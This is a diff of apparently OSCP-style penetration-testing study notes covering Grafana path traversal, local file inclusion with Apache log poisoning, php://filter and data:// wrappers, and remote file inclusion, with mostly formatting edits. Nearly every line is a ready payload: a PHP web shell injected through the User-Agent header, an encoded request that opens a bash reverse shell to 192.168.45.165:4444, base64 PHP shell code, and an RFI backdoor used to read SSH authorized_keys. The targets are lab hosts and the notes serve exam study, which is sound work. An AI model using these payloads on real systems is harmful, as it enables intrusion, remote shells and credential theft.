@@ -626,9 +626,11 @@
   - Grafana URL partial encoding bypass
     - `curl --path-as-is http://192.168.163.16:3000/public/plugins/alertlist/%2E./%2E./%2E./%2E./../../../../opt/install.txt`
 - 9.2.1 Local file inclusion (LFI)
-  - write system cmd to access.log file  
-    `User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>`: embed system cmd  
-    `GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.165%2F4444%200%3E%261%22`: run url encoding web shell command
+  - write system cmd to **access.log** file  
+    embed system cmd  
+    `User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>`  
+    run url encoding web shell command  
+    `GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.165%2F4444%200%3E%261%22`
   - LFI **/opt/admin.bak.php**  
     `curl http://mountaindesserts.com:8001/meteor/index.php?page=../../../../../../../../../opt/admin.bak.php`
   - windows LFI + **Log poisoning** C:\xampp\apache\logs\  
@@ -638,7 +640,7 @@
   - LFI **php://filter** to include content of /var/www/html/backup.php  
     `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php`  
   - LFI **data://** PHP to execute uname -a  
-    base64: echo -n `<?php echo system($_GET["cmd"]);?>`      
+    base64: echo -n `<?php echo system($_GET["cmd"]);?>`   
     `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname -a"`
 - 9.2.3 Remote File inclusion (RFI)
   - RFI to include /usr/share/webshells/php/simple-backdoor.php + cmd to **cat /home/elaine/.ssh/authorized_keys**
